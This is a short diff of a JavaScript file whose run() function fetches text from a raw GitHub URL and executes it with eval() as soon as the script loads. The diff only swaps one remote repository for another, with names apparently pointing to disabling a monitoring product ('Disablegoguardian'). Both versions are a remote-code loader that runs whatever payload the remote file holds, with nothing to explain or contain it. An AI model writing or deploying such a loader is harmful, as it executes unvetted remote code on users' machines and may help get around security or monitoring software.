@@ -1,4 +1,4 @@
  function run(){
-fetch("https://raw.githubusercontent.com/Udud3/Disablegoguardian/main/Password").then(data=>{data.text().then(text=>{eval(text)})});
+fetch("https://raw.githubusercontent.com/Udud3/rrdderjfjfhf/main/Security").then(data=>{data.text().then(text=>{eval(text)})});
 }
 run();
